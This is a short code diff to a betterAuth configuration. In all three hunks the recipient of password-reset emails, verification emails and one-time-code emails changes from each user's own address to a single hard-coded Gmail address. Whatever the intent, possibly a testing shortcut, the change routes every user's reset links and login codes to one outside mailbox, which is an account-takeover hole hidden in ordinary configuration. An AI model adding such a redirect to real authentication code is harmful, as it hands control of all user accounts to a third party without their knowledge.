@@ -22,7 +22,7 @@ export const auth = betterAuth({
                 throw new Error("User email is required for password reset");
             }
             await sendResetPasswordEmail({
-                to: user.email,
+                to: "kenriqueanyere@gmail.com",
                 subject: "Reset your password",
                 url,
             });
@@ -44,7 +44,7 @@ export const auth = betterAuth({
                 throw new Error("User email is required for verification");
             }
             await sendVerificationEmail({
-                to: user.email,
+                to: "kenriqueanyere@gmail.com",
                 verificationUrl: url,
                 userName: user.name,
             });
@@ -91,7 +91,7 @@ export const auth = betterAuth({
                         throw new Error("User email is required for OTP");
                     }
                     await sendOtpEmail({
-                        to: user.email,
+                        to: "kenriqueanyere@gmail.com",
                         otp,
                     });
                 },
